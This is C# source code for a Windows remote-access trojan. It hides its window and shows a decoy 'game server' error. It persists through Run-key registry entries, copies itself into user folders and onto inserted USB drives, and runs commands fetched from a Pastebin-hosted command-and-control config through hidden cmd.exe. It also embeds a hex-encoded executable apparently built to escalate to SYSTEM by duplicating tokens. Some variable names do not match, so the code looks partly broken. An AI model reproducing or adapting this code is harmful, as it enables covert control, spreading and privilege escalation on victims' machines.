using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Reflection;
using System.Net.Sockets;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows;
using Microsoft.Win32;
using System.Threading;
using System.Collections.Generic;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Linq.Expressions;

namespace Net
{
    internal class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtRaiseHardError(
        uint ErrorStatus,
        uint NumberOfParameters,
        uint UnicodeStringParameterMask,
        IntPtr Parameters,
        uint ValidResponseOptions,
        out uint Response
    );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern bool RtlAdjustPrivilege(
            int Privilege,
            bool Enable,
            bool CurrentThread,
            out bool Enabled
        );

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        static void SetStartup(string exeName, string exePath)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            rk.SetValue(exeName, exePath);
        }

        static void HideConsoleWindow()
        {
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero)
                ShowWindow(handle, SW_HIDE);
        }

        static async Task Main()
        {
            Sys();
            runadmin();
            HideConsoleWindow();
            string exepath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            SetStartup("Net", exePath);
            string url = "https://pastebin.com/raw/*****"; // not showing you
            string doc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string target = Path.Combine(doc, Path.GetFileName(exepath));
            string exe = Assembly.GetExecutingAssembly().Location;
            string dll = Path.Combine(Path.GetDirectoryName(exepath), "Newtonsoft.Json.dll");

            SetStartup("Win32RequiredServices", target);
            CopyToDocuments();
            CopyToUserFolder();

            Console.WriteLine("Failed to connect game server.");

            while (true)
            {
                try
                {
                    await Task.Delay(5000);

                    MonitorUSB();

                    HttpClient client = new HttpClient();

                    string jsonresponse = await client.GetStringAsync(url);

                    var config = JsonConvert.DeserializeObject<C2Config>(jsonersponse);

                    if (config.RunCommand?.ToLower() == "yes" && !string.IsNullOrWhiteSpace(config.Command))
                    {
                        await Task.Delay(30000);
                        RunCommand(config.Command);
                    }

                    
                }
                catch (Exception ex)
                {

                }
            }
        }

        static void RunCommand(string command)
        {
            Console.WriteLine($"");

            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", $"/c {command}")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
            };

            using (Process p = Process.Start(psi))
            {
                string output = p.StandardOutput.ReadToEnd();
                Console.WriteLine(output);
            }
        }

        static void MonitorUSB()
        {
            ManagementEventWatcher watcher = new ManagementEventWatcher();
            WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");

            watcher.EventArrived += new EventArrivedEventHandler((sender, e) =>
            {
                DriveInfo[] drives = DriveInfo.GetDrives();

                foreach (DriveInfo drive in drives)
                {
                    if (drive.DriveType == DriveType.Removable && drive.IsReady)
                    {
                        string openmepath = Path.Combine(drive.RootDirectory.FullName, "OPENME");

                        if (!Directory.Exists(openmepath))
                        {
                            Directory.CreateDirectory(openmepath);

                            string exePath = Assembly.GetExecutingAssembly().Location;
                            string dllPath = Path.Combine(Path.GetDirectoryName(exePath), "Newtonsoft.Json.dll");

                            File.Copy(exePath, Path.Combine(openmepath, Path.GetFileName(exePath)), overwrite: false);

                            if (File.Exists(dllPath))
                            {
                                File.Copy(dllPath, Path.Combine(openmepath, "Newtonsoft.Json.dll"), overwrite: false);
                            }

                        }
                        else
                        {

                        }
                    }
                }
            });

            watcher.Query = query;
            watcher.Start();
        }

        static void CopyToDocuments()
        {
            try
            {
                string documentspath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                string exepath = Assembly.GetExecutingAssembly().Location;
                string dllpath = Path.Combine(Path.GetDirectoryName(exepath), "Newtonsoft.Json.dll");

                string targetexepath = Path.Combine(documentspath, Path.GetFileName(exepath));
                string targetdllpath = Path.Combine(documentspath, "Newtonsoft.Json.dll");

                File.Copy(exepath, targetexepath, overwrite: false);

                if (File.Exists(dllPath))
                {
                    File.Copy(dllPath, targetDllPath, overwrite: false);
                }
                else
                {
                }
            }
            catch (Exception ex)
            {

            }
        }

        static void CopyToUserFolder()
        {
            try
            {
                string userfolderpath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                string exepath = Assembly.GetExecutingAssembly().Location;
                string dllpath = Path.Combine(Path.GetDirectoryName(exepath), "Newtonsoft.Json.dll");

                string targetexepath = Path.Combine(userfolderpath, Path.GetFileName(exepath));
                string targetdllpath = Path.Combine(userfolderpath, "Newtonsoft.Json.dll");

                File.Copy(exepath, targetexepath, overwrite: false);

                if (File.Exists(dllpath))
                {
                    File.Copy(dllpath, targetdllpath, overwrite: false);
                }
                else
                {

                }
            }
            catch (Exception ex)
            {

            }
        }

       
        public class C2Config
        {
            public string Command { get; set; }
            public string RunCommand { get; set; }
        }

        #region WinAPI

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        private const int SW_SHOWNORMAL = 1;
        private const int SW_SHOWMINIMIZED = 2;
        private const int SW_SHOWMAXIMIZED = 3;
        private const int SW_SHOWNOACTIVATE = 4;
        private const int SW_MINIMIZE = 6;
        private const int SW_SHOWMINNOACTIVE = 7;
        private const int SW_SHOWNA = 8;
        private const int SW_RESTORE = 9;
        private const int SW_SHOWDEFAULT = 10;

        [Serializable]
        private struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }

        [Serializable]
        private struct POINT
        {
            public int X;
            public int Y;
        }

        [Serializable]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        #endregion

        static void Sys()
        {
            try
            {
                string hexstring = "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 50 45 00 00 4C 01 03 00 F3 4E DA D7 00 00 00 00 00 00 00 00 E0 00 22 00 0B 01 30 00 00 14 00 00 00 08 00 00 00 00 00 00 5E 32 00 00 00 20 00 00 00 40 00 00 00 00 40 00 00 20 00 00 00 02 00 00 04 00 00 00 00 00 00 00 06 00 00 00 00 00 00 00 00 80 00 00 00 02 00 00 00 00 00 00 03 00 60 85 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 0A 32 00 00 4F 00 00 00 00 40 00 00 A4 05 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 60 00 00 0C 00 00 00 78 31 00 00 38 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 08 00 00 00 00 00 00 00 00 00 00 00 08 20 00 00 48 00 00 00 00 00 00 00 00 00 00 00 2E 74 65 78 74 00 00 00 64 12 00 00 00 20 00 00 00 14 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60 2E 72 73 72 63 00 00 00 A4 05 00 00 00 40 00 00 00 06 00 00 00 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2E 72 65 6C 6F 63 00 00 0C 00 00 00 00 60 00 00 00 02 00 00 00 1C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 42 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3E 32 00 00 00 00 00 00 48 00 00 00 02 00 05 00 60 22 00 00 18 0F 00 00 03 00 02 00 09 00 00 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 13 30 07 00 B7 00 00 00 01 00 00 11 00 16 0A 02 17 7E 0F 00 00 0A 16 12 00 28 06 00 00 06 26 06 28 10 00 00 0A 0B 02 17 07 06 12 09 28 06 00 00 06 16 FE 01 13 08 11 08 2C 11 00 07 28 11 00 00 0A 00 72 01 00 00 70 13 0A 2B 75 07 28 01 00 00 2B 0C 1F 40 73 13 00 00 0A 0D 1F 40 73 13 00 00 0A 13 04 09 6F 14 00 00 0A 13 05 11 04 6F 14 00 00 0A 13 06 14 08 7B 20 00 00 04 7B 21 00 00 04 09 12 05 11 04 12 06 12 07 28 07 00 00 06 16 FE 01 13 0B 11 0B 2C 11 00 07 28 11 00 00 0A 00 72 01 00 00 70 13 0A 2B 18 07 28 11 00 00 0A 00 72 03 00 00 70 11 04 09 28 15 00 00 0A 13 0A 2B 00 11 0A 2A 00 1B 30 09 00 21 01 00 00 02 00 00 11 00 72 13 00 00 70 0A 28 16 00 00 0A 0B 00 07 0C 16 0D 38 00 01 00 00 08 09 9A 13 04 00 00 20 00 04 00 00 16 11 04 6F 17 00 00 0A 28 01 00 00 06 13 05 11 05 7E 0F 00 00 0A 28 18 00 00 0A 13 08 11 08 2C 05 DD CA 00 00 00 11 05 1F 0B 12 06 28 02 00 00 06 16 FE 01 13 09 11 09 2C 0E 00 11 05 28 05 00 00 06 26 DD A8 00 00 00 11 06 28 08 00 00 06 13 07 11 07 72 23 00 00 70 28 19 00 00 0A 13 0A 11 0A 2C 74 00 11 06 20 00 00 00 02 7E 0F 00 00 0A 18 17 12 0B 28 03 00 00 06 13 0C 11 0C 2C 57 00 12 0D FE 15 03 00 00 02 12 0D D0 03 00 00 02 28 1A 00 00 0A 28 1B 00 00 0A 7D 0A 00 00 04 11 0B 17 06 14 1F 10 7E 0F 00 00 0A 14 12 0D 12 0E 28 04 00 00 06 13 0F 11 0F 2D 07 72 01 00 00 70 2B 05 72 01 00 00 70 28 1C 00 00 0A 00 11 0B 28 05 00 00 06 26 DE 27 00 11 06 28 05 00 00 06 26 11 05 28 05 00 00 06 26 00 DE 05 26 00 00 DE 00 00 09 17 58 0D 09 08 8E 69 3F F7 FE FF FF 2A 00 00 00 01 10 00 00 00 00 1D 00 F0 0D 01 05 10 00 00 01 22 02 28 1D 00 00 0A 00 2A 00 00 00 42 53 4A 42 01 00 01 00 00 00 00 00 0C 00 00 00 76 34 2E 30 2E 33 30 33 31 39 00 00 00 00 05 00 6C 00 00 00 44 05 00 00 23 7E 00 00 B0 05 00 00 0C 07 00 00 23 53 74 72 69 6E 67 73 00 00 00 00 BC 0C 00 00 4C 00 00 00 23 55 53 00 08 0D 00 00 10 00 00 00 23 47 55 49 44 00 00 00 18 0D 00 00 00 02 00 00 23 42 6C 6F 62 00 00 00 00 00 00 00 02 00 00 01 57 1D 02 14 09 0A 00 00 00 FA 01 33 00 16 00 00 01 00 00 00 19 00 00 00 06 00 00 00 22 00 00 00 0A 00 00 00 23 00 00 00 1D 00 00 00 09 00 00 00 0E 00 00 00 02 00 00 00 02 00 00 00 07 00 00 00 01 00 00 00 02 00 00 00 04 00 00 00 01 00 00 00 00 00 E7 03 01 00 00 00 00 00 06 00 5C 03 BA 05 06 00 C9 03 BA 05 06 00 80 02 88 05 0F 00 DA 05 00 00 06 00 A8 02 2F 05 06 00 3F 03 2F 05 06 00 20 03 2F 05 06 00 B0 03 2F 05 06 00 7C 03 2F 05 06 00 95 03 2F 05 06 00 BF 02 2F 05 06 00 94 02 9B 05 06 00 72 02 9B 05 06 00 03 03 2F 05 06 00 DA 02 0A 04 06 00 8C 06 AD 04 06 00 5E 05 B6 06 0A 00 7C 06 88 05 06 00 49 02 AD 04 06 00 81 05 AD 04 06 00 70 04 9B 05 06 00 24 04 AD 04 06 00 58 02 AD 04 06 00 6B 01 AD 04 06 00 C4 01 AD 04 00 00 00 00 19 00 00 00 00 00 01 00 01 00 00 00 10 00 A5 04 00 00 41 00 01 00 01 00 0A 01 10 00 A3 00 00 00 4D 00 0A 00 0B 00 0A 01 10 00 5E 00 00 00 4D 00 1C 00 0B 00 0A 01 10 00 AF 00 00 00 4D 00 20 00 0B 00 0A 01 10 00 BA 00 00 00 4D 00 21 00 0B 00 51 80 55 00 BA 00 51 80 72 00 BA 00 51 80 45 00 BA 00 51 80 0D 01 BA 00 51 80 F8 00 BA 00 51 80 22 00 BA 00 51 80 32 00 BA 00 51 80 8C 00 BA 00 51 80 EA 00 BA 00 06 00 1D 01 BA 00 06 00 4F 01 2C 00 06 00 54 05 2C 00 06 00 CC 01 2C 00 06 00 E6 00 BA 00 06 00 19 01 BA 00 06 00 F3 03 BA 00 06 00 FB 03 BA 00 06 00 2D 06 BA 00 06 00 3B 06 BA 00 06 00 F3 02 BA 00 06 00 25 06 BA 00 06 00 C2 06 BD 00 06 00 01 00 BD 00 06 00 0D 00 2C 00 06 00 A1 06 2C 00 06 00 AB 06 2C 00 06 00 71 05 2C 00 06 00 6F 06 2C 00 06 00 47 01 2C 00 06 00 3B 01 BA 00 06 00 30 01 BA 00 06 00 6C 05 C0 00 06 00 67 01 2C 00 06 00 FD 05 BA 00 00 00 00 00 80 00 91 20 78 06 C4 00 01 00 00 00 00 00 80 00 91 20 DF 04 CB 00 04 00 00 00 00 00 80 00 91 20 CE 06 D3 00 07 00 00 00 00 00 80 00 91 20 CE 00 DE 00 0D 00 00 00 00 00 80 00 91 20 7D 01 EF 00 16 00 00 00 00 00 80 00 91 20 06 05 F4 00 17 00 00 00 00 00 80 00 91 20 5A 01 FE 00 1C 00 50 20 00 00 00 00 91 00 CA 04 0E 01 23 00 14 21 00 00 00 00 91 00 01 05 13 01 24 00 54 22 00 00 00 00 86 18 7B 05 06 00 24 00 00 00 01 00 5F 06 00 00 02 00 B5 01 00 00 03 00 3B 01 00 00 01 00 A7 01 00 00 02 00 61 06 02 00 03 00 9B 01 00 00 01 00 B4 04 00 00 02 00 5F 06 00 00 03 00 F6 05 00 00 04 00 78 04 00 00 05 00 53 02 02 00 06 00 F0 04 00 00 01 00 C3 04 00 00 02 00 08 06 00 00 03 00 18 02 00 00 04 00 31 02 00 00 05 00 15 06 00 00 06 00 93 06 00 00 07 00 DF 06 00 00 08 00 41 05 02 00 09 00 1A 05 00 00 01 00 8B 06 00 00 01 00 9B 01 00 00 02 00 49 06 00 00 03 00 09 05 00 00 04 00 2B 04 02 00 05 00 42 04 00 00 01 00 DC 01 00 00 02 00 67 01 00 00 03 00 2A 02 00 00 04 00 D4 01 00 00 05 00 01 02 00 00 06 00 E9 01 02 00 07 00 6C 02 00 00 01 00 FB 04 09 00 7B 05 01 00 11 00 7B 05 06 00 19 00 7B 05 0A 00 29 00 7B 05 10 00 31 00 7B 05 10 00 39 00 7B 05 10 00 41 00 7B 05 10 00 49 00 7B 05 10 00 51 00 7B 05 10 00 59 00 7B 05 10 00 61 00 7B 05 15 00 69 00 7B 05 10 00 71 00 7B 05 10 00 79 00 7B 05 10 00 A1 00 4F 05 2C 00 A9 00 57 04 2F 00 A9 00 64 04 34 00 A9 00 5D 02 39 00 89 00 7B 05 01 00 89 00 F2 06 45 00 B1 00 84 06 49 00 91 00 E9 05 6A 00 91 00 29 01 45 00 A1 00 FF 06 70 00 B1 00 FF 06 76 00 B9 00 89 01 7C 00 A9 00 03 04 83 00 C9 00 3F 02 89 00 81 00 7B 05 06 00 08 00 04 00 97 00 08 00 08 00 9C 00 08 00 0C 00 A1 00 08 00 10 00 A6 00 08 00 14 00 AB 00 08 00 18 00 B0 00 08 00 1C 00 B5 00 08 00 20 00 A1 00 08 00 24 00 AB 00 2E 00 0B 00 17 01 2E 00 13 00 20 01 2E 00 1B 00 3F 01 2E 00 23 00 48 01 2E 00 2B 00 55 01 2E 00 33 00 55 01 2E 00 3B 00 5B 01 2E 00 43 00 48 01 2E 00 4B 00 63 01 2E 00 53 00 55 01 2E 00 5B 00 55 01 2E 00 63 00 7D 01 2E 00 6B 00 A7 01 2E 00 73 00 B4 01 1A 00 50 00 98 04 8B 04 00 01 03 00 78 06 01 00 40 01 05 00 DF 04 02 00 40 01 07 00 CE 06 02 00 44 01 09 00 CE 00 02 00 40 01 0B 00 7D 01 01 00 40 01 0D 00 06 05 02 00 46 01 0F 00 5A 01 02 00 04 80 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 4F 04 00 00 04 00 00 00 00 00 00 00 00 00 00 00 8E 00 20 01 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 8E 00 AD 04 00 00 00 00 03 00 02 00 04 00 02 00 05 00 02 00 06 00 02 00 25 00 40 00 00 00 00 00 00 63 62 52 65 73 65 72 76 65 64 32 00 6C 70 52 65 73 65 72 76 65 64 32 00 3C 4D 6F 64 75 6C 65 3E 00 4D 41 58 49 4D 55 4D 5F 41 4C 4C 4F 57 45 44 00 43 52 45 41 54 45 5F 4E 45 57 5F 43 4F 4E 53 4F 4C 45 00 54 4F 4B 45 4E 5F 44 55 50 4C 49 43 41 54 45 00 4D 41 58 5F 50 41 54 48 00 50 52 4F 43 45 53 53 5F 49 4E 46 4F 52 4D 41 54 49 4F 4E 00 50 52 4F 43 45 53 53 5F 51 55 45 52 59 5F 49 4E 46 4F 52 4D 41 54 49 4F 4E 00 53 45 43 55 52 49 54 59 5F 49 4D 50 45 52 53 4F 4E 41 54 49 4F 4E 00 53 54 41 52 54 55 50 49 4E 46 4F 00 54 4F 4B 45 4E 5F 55 53 45 52 00 5F 53 49 44 5F 41 4E 44 5F 41 54 54 52 49 42 55 54 45 53 00 43 72 65 61 74 65 50 72 6F 63 65 73 73 57 69 74 68 54 6F 6B 65 6E 57 00 64 77 58 00 54 4F 4B 45 4E 5F 50 52 49 4D 41 52 59 00 54 4F 4B 45 4E 5F 41 53 53 49 47 4E 5F 50 52 49 4D 41 52 59 00 54 4F 4B 45 4E 5F 51 55 45 52 59 00 64 77 59 00 63 62 00 6D 73 63 6F 72 6C 69 62 00 67 65 74 5F 49 64 00 64 77 54 68 72 65 61 64 49 64 00 64 77 50 72 6F 63 65 73 73 49 64 00 68 54 68 72 65 61 64 00 6C 70 52 65 73 65 72 76 65 64 00 4C 6F 6F 6B 75 70 41 63 63 6F 75 6E 74 53 69 64 00 52 75 6E 74 69 6D 65 54 79 70 65 48 61 6E 64 6C 65 00 43 6C 6F 73 65 48 61 6E 64 6C 65 00 47 65 74 54 79 70 65 46 72 6F 6D 48 61 6E 64 6C 65 00 54 6F 6B 65 6E 48 61 6E 64 6C 65 00 50 72 6F 63 65 73 73 48 61 6E 64 6C 65 00 62 49 6E 68 65 72 69 74 48 61 6E 64 6C 65 00 43 6F 6E 73 6F 6C 65 00 6C 70 54 69 74 6C 65 00 63 63 68 4E 61 6D 65 00 6C 70 53 79 73 74 65 6D 4E 61 6D 65 00 63 63 68 52 65 66 65 72 65 6E 63 65 64 44 6F 6D 61 69 6E 4E 61 6D 65 00 6C 70 52 65 66 65 72 65 6E 63 65 64 44 6F 6D 61 69 6E 4E 61 6D 65 00 6C 70 41 70 70 6C 69 63 61 74 69 6F 6E 4E 61 6D 65 00 6C 70 4E 61 6D 65 00 6C 70 43 6F 6D 6D 61 6E 64 4C 69 6E 65 00 57 72 69 74 65 4C 69 6E 65 00 56 61 6C 75 65 54 79 70 65 00 54 6F 6B 65 6E 54 79 70 65 00 50 74 72 54 6F 53 74 72 75 63 74 75 72 65 00 70 65 55 73 65 00 47 75 69 64 41 74 74 72 69 62 75 74 65 00 44 65 62 75 67 67 61 62 6C 65 41 74 74 72 69 62 75 74 65 00 43 6F 6D 56 69 73 69 62 6C 65 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 54 69 74 6C 65 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 54 72 61 64 65 6D 61 72 6B 41 74 74 72 69 62 75 74 65 00 54 61 72 67 65 74 46 72 61 6D 65 77 6F 72 6B 41 74 74 72 69 62 75 74 65 00 64 77 46 69 6C 6C 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 46 69 6C 65 56 65 72 73 69 6F 6E 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 43 6F 6E 66 69 67 75 72 61 74 69 6F 6E 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 44 65 73 63 72 69 70 74 69 6F 6E 41 74 74 72 69 62 75 74 65 00 43 6F 6D 70 69 6C 61 74 69 6F 6E 52 65 6C 61 78 61 74 69 6F 6E 73 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 50 72 6F 64 75 63 74 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 43 6F 70 79 72 69 67 68 74 41 74 74 72 69 62 75 74 65 00 41 73 73 65 6D 62 6C 79 43 6F 6D 70 61 6E 79 41 74 74 72 69 62 75 74 65 00 52 75 6E 74 69 6D 65 43 6F 6D 70 61 74 69 62 69 6C 69 74 79 41 74 74 72 69 62 75 74 65 00 6D 65 6D 6C 65 61 6B 2E 65 78 65 00 64 77 58 53 69 7A 65 00 64 77 59 53 69 7A 65 00 53 69 7A 65 4F 66 00 53 79 73 74 65 6D 2E 52 75 6E 74 69 6D 65 2E 56 65 72 73 69 6F 6E 69 6E 67 00 53 74 72 69 6E 67 00 54 6F 6B 65 6E 49 6E 66 6F 72 6D 61 74 69 6F 6E 4C 65 6E 67 74 68 00 52 65 74 75 72 6E 4C 65 6E 67 74 68 00 6D 65 6D 6C 65 61 6B 00 41 6C 6C 6F 63 48 47 6C 6F 62 61 6C 00 46 72 65 65 48 47 6C 6F 62 61 6C 00 4D 61 72 73 68 61 6C 00 49 6D 70 65 72 73 6F 6E 61 74 69 6F 6E 4C 65 76 65 6C 00 61 64 76 61 70 69 33 32 2E 64 6C 6C 00 6B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 50 72 6F 67 72 61 6D 00 53 79 73 74 65 6D 00 68 45 78 69 73 74 69 6E 67 54 6F 6B 65 6E 00 68 54 6F 6B 65 6E 00 47 65 74 55 73 65 72 6E 61 6D 65 46 72 6F 6D 54 6F 6B 65 6E 00 4F 70 65 6E 50 72 6F 63 65 73 73 54 6F 6B 65 6E 00 70 68 4E 65 77 54 6F 6B 65 6E 00 74 6F 6B 65 6E 00 4D 61 69 6E 00 47 65 74 54 6F 6B 65 6E 49 6E 66 6F 72 6D 61 74 69 6F 6E 00 6C 70 50 72 6F 63 65 73 73 49 6E 66 6F 72 6D 61 74 69 6F 6E 00 53 79 73 74 65 6D 2E 52 65 66 6C 65 63 74 69 6F 6E 00 6C 70 53 74 61 72 74 75 70 49 6E 66 6F 00 5A 65 72 6F 00 6C 70 44 65 73 6B 74 6F 70 00 53 74 72 69 6E 67 42 75 69 6C 64 65 72 00 55 73 65 72 00 68 53 74 64 45 72 72 6F 72 00 2E 63 74 6F 72 00 49 6E 74 50 74 72 00 53 79 73 74 65 6D 2E 44 69 61 67 6E 6F 73 74 69 63 73 00 53 79 73 74 65 6D 2E 52 75 6E 74 69 6D 65 2E 49 6E 74 65 72 6F 70 53 65 72 76 69 63 65 73 00 53 79 73 74 65 6D 2E 52 75 6E 74 69 6D 65 2E 43 6F 6D 70 69 6C 65 72 53 65 72 76 69 63 65 73 00 44 65 62 75 67 67 69 6E 67 4D 6F 64 65 73 00 47 65 74 50 72 6F 63 65 73 73 65 73 00 6C 70 54 6F 6B 65 6E 41 74 74 72 69 62 75 74 65 73 00 64 77 4C 6F 67 6F 6E 46 6C 61 67 73 00 64 77 43 72 65 61 74 69 6F 6E 46 6C 61 67 73 00 64 77 46 6C 61 67 73 00 64 77 58 43 6F 75 6E 74 43 68 61 72 73 00 64 77 59 43 6F 75 6E 74 43 68 61 72 73 00 54 6F 6B 65 6E 49 6E 66 6F 72 6D 61 74 69 6F 6E 43 6C 61 73 73 00 64 77 44 65 73 69 72 65 64 41 63 63 65 73 73 00 68 50 72 6F 63 65 73 73 00 4F 70 65 6E 50 72 6F 63 65 73 73 00 46 6F 72 6D 61 74 00 68 4F 62 6A 65 63 74 00 6C 70 45 6E 76 69 72 6F 6E 6D 65 6E 74 00 68 53 74 64 49 6E 70 75 74 00 68 53 74 64 4F 75 74 70 75 74 00 53 79 73 74 65 6D 2E 54 65 78 74 00 77 53 68 6F 77 57 69 6E 64 6F 77 00 44 75 70 6C 69 63 61 74 65 54 6F 6B 65 6E 45 78 00 6C 70 43 75 72 72 65 6E 74 44 69 72 65 63 74 6F 72 79 00 67 65 74 5F 43 61 70 61 63 69 74 79 00 6F 70 5F 45 71 75 61 6C 69 74 79 00 00 00 01 00 0F 7B 00 30 00 7D 00 2F 00 7B 00 31 00 7D 00 00 0F 4E 00 65 00 74 00 2E 00 65 00 78 00 65 00 00 27 4E 00 54 00 20 00 41 00 55 00 54 00 48 00 4F 00 52 00 49 00 54 00 59 00 2F 00 53 00 59 00 53 00 54 00 45 00 4D 00 00 00 11 24 37 82 22 5F F9 42 8C AA 19 1F 87 19 DF 37 00 04 20 01 01 08 03 20 00 01 05 20 01 01 11 11 04 20 01 01 0E 04 20 01 01 02 11 07 0C 08 18 11 14 12 45 12 45 08 08 08 02 08 0E 02 02 06 18 04 00 01 18 08 04 00 01 01 18 06 10 01 01 1E 00 18 04 0A 01 11 14 03 20 00 08 06 00 03 0E 0E 1C 1C 19 07 10 0E 1D 12 49 1D 12 49 08 12 49 18 18 0E 02 02 02 18 02 11 0C 11 10 02 05 00 00 1D 12 49 05 00 02 02 18 18 05 00 02 02 0E 0E 06 00 01 12 5D 11 61 05 00 01 08 12 5D 04 00 01 01 0E 08 B7 7A 5C 56 19 34 E0 89 04 04 01 00 00 04 00 04 00 00 04 02 00 00 00 04 08 00 00 00 04 01 00 00 00 04 00 00 00 02 04 10 00 00 00 02 06 08 02 06 06 03 06 11 18 06 00 03 18 08 02 08 07 00 03 02 18 09 10 18 0A 00 06 02 18 09 18 08 08 10 18 10 00 09 02 18 08 0E 0E 08 18 0E 10 11 0C 10 11 10 04 00 01 02 18 09 00 05 02 18 08 18 08 10 08 0F 00 07 02 0E 18 12 45 10 08 12 45 10 08 10 08 04 00 01 0E 18 03 00 00 01 08 01 00 08 00 00 00 00 00 1E 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78 63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 08 01 00 07 01 00 00 00 00 0C 01 00 07 6D 65 6D 6C 65 61 6B 00 00 05 01 00 00 00 00 07 01 00 02 48 50 00 00 19 01 00 14 43 6F 70 79 72 69 67 68 74 20 C2 A9 20 48 50 20 32 30 32 35 00 00 29 01 00 24 62 33 61 33 65 37 63 30 2D 63 38 33 36 2D 34 61 31 36 2D 39 62 62 36 2D 65 33 35 66 66 32 32 30 34 33 35 38 00 00 0C 01 00 07 31 2E 30 2E 30 2E 30 00 00 49 01 00 1A 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B 2C 56 65 72 73 69 6F 6E 3D 76 34 2E 38 01 00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73 70 6C 61 79 4E 61 6D 65 12 2E 4E 45 54 20 46 72 61 6D 65 77 6F 72 6B 20 34 2E 38 00 00 00 00 00 00 6F 62 F2 C1 00 00 00 00 02 00 00 00 5A 00 00 00 B0 31 00 00 B0 13 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 52 53 44 53 E9 05 74 34 66 85 CC 47 B6 6C CA 12 D2 6E 3A B0 01 00 00 00 43 3A 5C 55 73 65 72 73 5C 6D 73 65 76 65 5C 73 6F 75 72 63 65 5C 72 65 70 6F 73 5C 6D 65 6D 6C 65 61 6B 5C 6D 65 6D 6C 65 61 6B 5C 6F 62 6A 5C 44 65 62 75 67 5C 6D 65 6D 6C 65 61 6B 2E 70 64 62 00 32 32 00 00 00 00 00 00 00 00 00 00 4C 32 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3E 32 00 00 00 00 00 00 00 00 00 00 00 00 5F 43 6F 72 45 78 65 4D 61 69 6E 00 6D 73 63 6F 72 65 65 2E 64 6C 6C 00 00 00 00 00 00 00 FF 25 00 20 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 